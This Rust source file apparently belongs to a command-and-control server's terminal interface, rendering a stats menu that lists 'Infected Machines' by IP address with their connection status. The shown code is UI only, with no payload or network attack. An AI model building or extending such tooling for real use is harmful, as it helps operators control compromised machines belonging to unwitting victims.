use std::path::PathBuf;

use ratatui::{
    buffer::Buffer,
    layout::{self, Constraint, Layout, Rect},
    style::Stylize,
    symbols::border,
    text::{Line, Span, Text},
    widgets::{Block, ListItem, ListState, Paragraph, Widget, Wrap},
    DefaultTerminal, Frame,
};

use crate::{domains::infected::{Infected, InfectedConnectionStatus}, interface::app::*, repos::database::{InfectedDatabase, InfectedRepo}};
use crate::domains::c4server::*;

impl App {
    pub fn render_stats_menu(&self, area: ratatui::prelude::Rect, buffer: &mut Buffer) {
        let infected_list = InfectedList::from_database(&self.infected_database);

        // Create a layout to split the area
        let main_layout = Layout::default()
            .direction(ratatui::layout::Direction::Horizontal)
            .constraints([
                Constraint::Percentage(50), 
                Constraint::Percentage(50),
            ])
            .split(area);

        self.default_menu_instruction(" Stats ", main_layout[0], buffer); //left

        let items: Vec<ListItem> = infected_list
            .items
            .iter()
            .map(|i| {
                let status_text = match i.connetion_status {
                    InfectedConnectionStatus::Connected => Span::from("Connected").green(),
                    InfectedConnectionStatus::Disconnected => Span::from("Disconnected").red(),
                    InfectedConnectionStatus::Awaiting => Span::from("Aawaiting").yellow(),
                };
                let line = Line::from(vec![
                    Span::from(format!("IP: {}", i.infected.ip())),
                    Span::from(" | "),
                    status_text,
                ]);
                ListItem::new(line)
            })
            .collect();

        let list_widget = ratatui::widgets::List::new(items)
            .block(Block::bordered().title("Infected Machines"))
            .highlight_style(ratatui::style::Style::default().yellow().bold());

        let mut state = infected_list.state.clone();
        ratatui::widgets::StatefulWidget::render(list_widget, main_layout[1], buffer, &mut state);
    }
}